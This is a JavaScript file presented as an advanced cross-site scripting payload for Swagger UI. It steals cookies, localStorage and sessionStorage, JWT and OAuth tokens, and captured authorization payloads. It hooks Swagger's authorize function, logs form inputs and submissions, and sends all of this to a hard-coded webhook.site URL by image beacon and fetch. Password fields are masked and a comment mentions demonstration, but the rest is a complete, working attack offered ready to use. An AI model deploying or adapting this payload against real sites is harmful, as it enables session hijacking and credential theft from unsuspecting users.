// Advanced XSS Payload for Swagger UI Exploitation
// Configure your webhook URL here
const WEBHOOK_URL = "https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2";

// Collect detailed information about the environment
const details = `
  🚨 XSS Detected 🚨
  ========================
  🏁 Origin: ${window.origin}
  🌐 Location: ${window.location}
  🔗 Href: ${window.location.href}
  🏢 Hostname: ${window.location.hostname}
  📂 Pathname: ${window.location.pathname}
  ❓ Search: ${window.location.search}
  👪 Parent Origin: ${window.parent?.origin || 'N/A'}
  🧑‍💻 Top Origin: ${window.top?.origin || 'N/A'}
  🖼️ Frames Length: ${window.frames.length}
  🪪 Window Name: ${window.name}
  ========================
  🍪 Cookies: ${document.cookie || 'No cookies available'}
  🕵️ User-Agent: ${navigator.userAgent}
  ⏳ Timestamp: ${new Date().toISOString()}
`;

// Show pop-up alert immediately
alert("🚨 XSS Alert: Your session has been compromised! 🚨");

// Create a more visually appealing pop-up
function createCustomPopup() {
    // Create popup container
    const popupContainer = document.createElement('div');
    popupContainer.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #f8d7da;
    border: 2px solid #dc3545;
    border-radius: 8px;
    padding: 20px;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
    z-index: 10000;
    width: 80%;
    max-width: 500px;
    font-family: Arial, sans-serif;
  `;

    // Create popup content
    const popupContent = document.createElement('div');
    popupContent.innerHTML = `
    <h2 style="color: #dc3545; text-align: center; margin-top: 0;">⚠️ Security Alert ⚠️</h2>
    <p style="font-size: 16px; margin-bottom: 15px;">Your session has been compromised and your data is being exfiltrated:</p>
    <div style="background-color: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px;">
      ${details.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;')}
    </div>
    <div style="text-align: center; margin-top: 15px;">
      <button id="close-popup" style="padding: 8px 16px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;">Close</button>
    </div>
  `;

    popupContainer.appendChild(popupContent);
    document.body.appendChild(popupContainer);

    // Add event listener to close button
    document.getElementById('close-popup').addEventListener('click', function() {
        document.body.removeChild(popupContainer);
    });
}

// Show custom popup after a short delay
setTimeout(createCustomPopup, 500);

// Log details to console for debugging
console.log(details);

// Function to exfiltrate data to webhook
function exfiltrateData(data) {
    // Create a beacon image to avoid CORS issues
    const img = new Image();
    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;

    // Also try fetch with no-cors as backup
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        // Silent fail
    }
}

// Extract and exfiltrate cookies
function stealCookies() {
    const cookieData = {
        type: 'cookies',
        cookies: document.cookie,
        url: window.location.href
    };
    exfiltrateData(cookieData);
}

// Extract localStorage and sessionStorage
function stealStorage() {
    const storageData = {
        type: 'storage',
        localStorage: {},
        sessionStorage: {}
    };

    // Get localStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageData.localStorage[key] = localStorage.getItem(key);
        }
    } catch (e) {
        storageData.localStorage = 'Error accessing localStorage';
    }

    // Get sessionStorage
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storageData.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch (e) {
        storageData.sessionStorage = 'Error accessing sessionStorage';
    }

    exfiltrateData(storageData);
}

// Extract Swagger-specific information
function extractSwaggerInfo() {
    const swaggerData = {
        type: 'swagger',
        endpoints: [],
        authInfo: {},
        version: 'unknown'
    };

    // Try to extract API endpoints from Swagger UI
    try {
        const pathElems = document.querySelectorAll('.opblock-summary-path');
        for (const el of pathElems) {
            swaggerData.endpoints.push(el.textContent.trim());
        }

        // Check for auth elements
        swaggerData.authInfo.hasAuth = !!document.querySelector('.auth-wrapper, .authorize');

        // Try to extract version
        const versionMatch = document.body.innerHTML.match(/swagger-ui-([0-9.]+)/);
        if (versionMatch) {
            swaggerData.version = versionMatch[1];
        }
    } catch (e) {
        swaggerData.error = e.message;
    }

    exfiltrateData(swaggerData);
}

// Look for authentication tokens in various formats
function findAuthTokens() {
    const tokenData = {
        type: 'tokens',
        jwt: [],
        oauth: {},
        other: {}
    };

    // Check localStorage for common token keys
    const tokenKeys = ['token', 'accessToken', 'access_token', 'auth', 'jwt', 'bearer', 'id_token'];
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (tokenKeys.some(tk => key.toLowerCase().includes(tk))) {
                const value = localStorage.getItem(key);
                // Check if it looks like a JWT
                if (value.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/)) {
                    tokenData.jwt.push({ key, value });
                } else {
                    tokenData.other[key] = value;
                }
            }
        }
    } catch (e) {
        tokenData.error = e.message;
    }

    // Look for OAuth info in Swagger UI
    try {
        if (window.ui && window.ui.authSelectors) {
            const authData = window.ui.authSelectors.authorized();
            if (authData) {
                tokenData.oauth = authData;
            }
        }
    } catch (e) {
        tokenData.oauthError = e.message;
    }

    exfiltrateData(tokenData);
}

// Hook into Swagger UI's authorization flow if available
function hookSwaggerAuth() {
    try {
        // Wait for Swagger UI to initialize
        const checkInterval = setInterval(() => {
            if (window.ui && window.ui.authActions && window.ui.authActions.authorize) {
                clearInterval(checkInterval);

                // Hook the authorize function
                const origAuth = window.ui.authActions.authorize;
                window.ui.authActions.authorize = function(payload) {
                    // Capture credentials
                    exfiltrateData({
                        type: 'auth_capture',
                        auth_data: payload
                    });

                    // Continue normal operation
                    return origAuth.apply(this, arguments);
                };
            }
        }, 500);
    } catch (e) {
        // Silent fail
    }
}

// Execute all data collection functions
stealCookies();
stealStorage();
setTimeout(extractSwaggerInfo, 1000); // Wait for Swagger UI to fully load
setTimeout(findAuthTokens, 1500);
setTimeout(hookSwaggerAuth, 2000);

// Set up keylogger to capture credentials
function setupKeylogger() {
    let buffer = '';
    let lastInput = null;

    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            lastInput = e.target;

            // Check if it's a password field
            const isPassword = e.target.type === 'password';
            const fieldName = e.target.name || e.target.id || 'unknown';

            // Capture the input
            exfiltrateData({
                type: 'input',
                field: fieldName,
                isPassword: isPassword,
                value: isPassword ? '********' : e.target.value, // Don't send actual passwords
                url: window.location.href
            });
        }
    });

    // Capture form submissions
    document.addEventListener('submit', function(e) {
        const formData = {};
        const form = e.target;

        // Collect all form inputs
        for (const element of form.elements) {
            if (element.name) {
                formData[element.name] = element.type === 'password' ? '********' : element.value;
            }
        }

        exfiltrateData({
            type: 'form_submit',
            formAction: form.action,
            formMethod: form.method,
            formData: formData,
            url: window.location.href
        });
    });
}

// Setup keylogger with a delay
setTimeout(setupKeylogger, 1000);

// Alert the user for demonstration purposes (remove in real attack)
// alert(details);
